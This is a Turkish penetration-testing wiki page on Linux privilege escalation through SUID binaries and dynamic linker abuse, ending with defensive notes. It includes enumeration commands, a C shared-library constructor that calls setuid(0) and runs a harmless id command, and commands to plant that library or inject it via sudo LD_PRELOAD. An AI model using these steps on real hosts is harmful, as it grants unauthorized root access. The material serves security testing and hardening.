# SUID Shared Library ve Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binary'ler genellikle doğrudan komut çalıştırma açısından incelenir, ancak özel SUID programları dynamic linker üzerinden de savunmasız olabilir. Ortak tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklı bir kullanıcının etkileyebileceği bir path veya configuration'dan kod yükler.<sup>[[1]](#references)</sup>

Bu sayfa genel technique kalıplarına odaklanır: eksik library'ler, yazılabilir library dizinleri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink karışıklığı.

Bu kontrollerin arkasındaki ELF program header'ları, dynamic section ve loader davranışı için [ELF basic information](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md) sayfasına bakın.

## Hızlı Enumeration

Olağandışı SUID dosyalarını bulup dynamic olarak link edilip edilmediklerini kontrol ederek başlayın:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Bilinmeyen bir çalıştırılabilir dosya için `readelf` kullanın: [`ldd`, güvenilmeyen bir ELF yorumlayıcısını çalıştırabilir](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` doğrudan bağımlılıkları gösterir; bu nedenle yükleyicinin gerçekten seçtiği yolu ayrıca doğrulayın.<sup>[[1]](#references)[[3]](#references)</sup>

Standart dışı konumlara, özel uygulama yollarına, root tarafından sahip olunan ancak paket yöneticilerinin yönettiği dizinlerin dışında bulunan ikili dosyalara ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.<sup>[[1]](#references)</sup>

Yazılabilirlik kontrolleri için:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Bazı özel SUID binary'leri var olmayan bir shared object'i yüklemeye çalışır. Eksik yol saldırganın denetimindeki bir dizinin altındaysa, binary saldırganın sağladığı kodu etkin kullanıcının yetkileriyle yükleyebilir.<sup>[[1]](#references)</sup>

Aynı durum, `dlopen()` ile çağıranın yazabildiği bir home veya yapılandırma dizini altındaki mutlak bir `.so` yolunu yükleyen ve **sudo üzerinden çalıştırılmasına izin verilen özel bir binary** için de geçerlidir. Bu geç yüklenen kütüphane `ldd` çıktısında ve ELF `NEEDED` kayıtlarında görünmeyebilir. Sınırlı bir `strings` incelemesi veya **yetkisiz** bir çalıştırmanın izlenmesi, denenmiş yolu ortaya çıkarabilir; uygulama parolası veya menü seçeneği bu aramayı koşula bağlayabilir. Bunu yetki yükseltme olarak değerlendirmeden önce sudo kuralını, tam yolu ve üst dizin izinlerini, ayrıca ayrıcalıklı çalıştırmanın bu aramaya ulaştığını doğrulayın. Sırf içeriğini listelemek için sudo hedefini çalıştırmayın.

Başarısız kütüphane aramalarını `strace` sistem çağrısı filtresiyle bulun:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Binary, `libexample.so` için yazılabilir bir yolu arıyorsa, minimal bir etki kanıtı kütüphanesi constructor kullanabilir. Doğrulama sırasında etki kanıtını zararsız tutun:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Binary'nin yüklemeye çalıştığı tam dosya adıyla derleyin:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Sömürülebilir koşul yalnızca library’nin eksik olması değildir. Saldırgan, ayrıcalıklı loader’ın kabul edeceği bir yola uyumlu bir shared object yerleştirebilmelidir.<sup>[[1]](#references)</sup>

## Yazılabilir Library Dizini

Bazen tüm bağımlılıklar mevcuttur, ancak bunları çözümlemek için kullanılan dizinlerden biri yazılabilirdir. Bu, yüklenmiş bir library’nin değiştirilmesine veya aynı ada sahip, önceliği daha yüksek bir library’nin yerleştirilmesine olanak sağlayabilir.<sup>[[1]](#references)</sup>

Aynı inceleme, ELF’in SUID bit’i olmasa ve izin verilen RunAs hesabı root olmasa bile, **sudo üzerinden izin verilen** özel bir ELF için de geçerlidir. `DT_NEEDED` girdilerini loader’ın çözeceği library yolu ile karşılaştırın; ardından çağıranın bu dosyaya yazıp yazamadığını veya yazılabilir ve aranabilir bir üst dizin üzerinden dosyayı değiştirip değiştiremediğini kontrol edin. Tam sudo RunAs kuralını, symlink’leri ve ACL’leri, loader politikasını ve hedef sürecin library’yi daha yüksek ayrıcalıklı hesap olarak yüklediğini doğrulayın. Yazılabilir bir `.so` dosyası veya tek başına bir bağımlılık adı yalnızca bir ipucudur; sudo komutunu çalıştırmadan metadata’yı inceleyin.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Bağımlılık yollarını inceleyin:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Dizin yazılabiliyorsa laboratuvar ortamında kopya üzerinde güvenli bir yaklaşımla doğrulayın. Canlı bir ana makinede sistem kitaplıklarını değiştirmek, aynı anda başlatılan süreçlerin tutarsız kitaplık sürümleriyle çalışmasına neden olabilir.<sup>[[8]](#references)</sup>

### chroot İçindeki Yazılabilir Kitaplıklar

Tek başına chroot, devralınan dosya tanımlayıcılarını kapatmaz veya tüm dosya sistemi erişimini kısıtlamaz. Bir sandbox, yeni kök dizininin dışına işaret eden bir dizin tanımlayıcısı bırakırsa ve hapsedilen süreç bu tanımlayıcıyı çözümleyebilirse (örneğin erişilebilir bir `/proc/<pid>/fd/` girdisi üzerinden), ana makine yollarına erişim devam edebilir. Bu, bir dosya sistemi sınırı sorunudur; tek başına root ayrıcalığı sağlamaz.<sup>[[11]](#references)[[12]](#references)</sup>

Hapsedilen kullanıcının, jail içinden başlatıldığında **ana makinedeki root-SUID yürütülebilir dosyanın** kullanacağı bir kitaplık dizinine yazıp yazamadığını ayrıca kontrol edin. Loader, bağımlılıkları sürecin dosya sistemi görünümüne göre çözümler; dolayısıyla saldırganın kontrolündeki bir kitaplık burada SUID programının etkin kimliğiyle çalışabilir. Yürütülebilir dosyanın tam yolunu, SUID bitini ve mount politikasını, tanımlayıcının hedefini ve erişim izinlerini, jail'in kitaplık arama yolunu ve programın ana makinedeki yürütülebilir dosyaya gerçekten erişebildiğini doğrulayın. Sandbox başlatıcısındaki bir file capability, yazılabilir bir jail veya tek başına bir ana makine SUID ikilisi yalnızca bir ipucudur; zincirin tamamı sandbox'ın uygulamasına bağlıdır.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH ve RUNPATH

`RPATH` ve `RUNPATH`, loader'a kitaplıkları nerede arayacağını söyleyen dinamik bölüm girdileridir. Saldırganın yazabildiği dizinlere işaret ettiklerinde SUID programlarında tehlikelidirler.<sup>[[1]](#references)</sup>

Bunları tespit edin:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Örnek riskli çıktı:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

`/opt/app/lib` yazılabilir durumdaysa ve binary `libcustom.so` gerektiriyorsa, saldırgan buraya kötü amaçlı bir `libcustom.so` yerleştirebilir:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir, ancak privilege escalation incelemesinde pratik soru aynıdır: SUID binary, bir library adı için saldırganın yazabildiği bir dizinde arama yapıyor mu?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH ve SUID

Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarda dynamic loader genellikle secure-execution mode'a geçer ve tehlikeli environment variable'ları yok sayar.<sup>[[1]](#references)</sup>

Bu, kullanıcının `LD_PRELOAD` ayarlayabiliyor olmasının tek başına düz bir SUID binary'yi genellikle savunmasız yapmadığı anlamına gelir:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Yaygın istisna, `SETENV` etiketi veya geçerli bir `setenv` seçeneği gibi, hedef için komut satırından ortam değişkeni atamasına izin veren bir sudo policy'dir. Hedef dinamik olarak bağlıysa ve sudo `LD_PRELOAD=/path/to/library` değerini kabul ederse, hedef çağıranın kontrolündeki kodu yükleyebilir. Etkin kuralı ve hedef kimliğini kontrol edin. Dinamik yükleyicinin, SUID `sudo` process'i başlamadan önce devralınan `LD_PRELOAD` değerini temizlediği sistemlerde, yalnızca `LD_PRELOAD` değerini `env_keep` içine eklemek yeterli değildir; komut satırındaki atama sudo tarafından kendi başlangıcından sonra değerlendirilir.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Bu durumları birbirine karıştırmayın; yukarıdaki yükleyici ve sudo policy kuralları bunları birbirinden ayırır:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- Normal bir SUID binary üzerinde `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
- Ayrıcalıklı, dinamik olarak bağlanmış bir hedef için sudo komut satırı ataması olarak kabul edilen `LD_PRELOAD`: potansiyel olarak istismar edilebilir.
- Yazılabilir bir yoldaki eksik `.so`: SUID binary bu yolu doğal olarak yüklediğinde istismar edilebilir.
- Yazılabilir bir dizini gösteren `RPATH`/`RUNPATH`: gerekli bir library kontrol edilebildiğinde istismar edilebilir.
- `/etc/ld.so.preload` veya linker config dosyalarına yazma erişimi: sistem genelini etkiler ve yüksek etkiye sahiptir.

## Linker Yapılandırması

`ld.so`, linker cache ve `/etc/ld.so.preload` dosyasını kullanır; `ldconfig`, bu cache'i `/etc/ld.so.conf` ve buradan dahil edilen dosyalardan oluşturur. Bu dosyalar genellikle `/etc/ld.so.conf.d/` içindedir.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Önemli kontroller:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Yazılabilir linker yapılandırması, tek bir güvenlik açığı bulunan SUID binary'den genellikle daha ciddi bir sorundur; çünkü dinamik olarak linklenmiş birçok süreci etkileyebilir. `/etc/ld.so.preload` özellikle tehlikelidir; ayrıcalıklı süreçlere bir shared object yüklenmesini zorunlu kılabilir.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink'ler aynı SUID inode'un birden fazla ad altında görünmesine neden olabilir.<sup>[[9]](#references)</sup> Bu, ayrıcalıklı bir yardımcı programı gizlemek, temizleme işlemlerini şaşırtmak veya naif, yol tabanlı incelemeleri atlatmak için kullanışlıdır.

Birden fazla linki olan SUID dosyalarını bulun:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Aynı inode'a sahip tüm yolları inceleyin:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Abuse, hardlink'in izinleri değiştirmesi değildir. Abuse, yol karmaşasıdır: ayrıcalıklı bir inode, savunmacıların veya script'lerin beklemediği bir ad üzerinden erişilebilir olabilir.<sup>[[9]](#references)</sup> Inode ve hardlink iş akışı hakkında daha fazla bilgi için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) sayfasına bakın.

## Defensive Notes

- SUID binary'lerini olabildiğince az sayıda tutun, denetleyin ve mümkünse paket yöneticisiyle yönetin.
- Yazılabilir veya uygulama tarafından yönetilen dizinleri gösteren `RPATH`/`RUNPATH` girdilerinden kaçının.<sup>[[1]](#references)[[8]](#references)</sup>
- Kütüphane dizinlerinin sahibi root olmalı ve bu dizinlere normal kullanıcılar yazamamalıdır.<sup>[[8]](#references)</sup>
- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader değişkenlerini sudo üzerinden korumayın.<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` dosya ve dizinlerini ve beklenmeyen SUID dosyalarını izleyin.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Hardlink'lenmiş SUID dosyalarını inceleyin ve standart sistem yollarının dışındaki özel SUID wrapper'larını araştırın.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux kılavuz sayfası](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dinamik Bağlayıcı Güçlendirmesi (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hardlink'ler (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
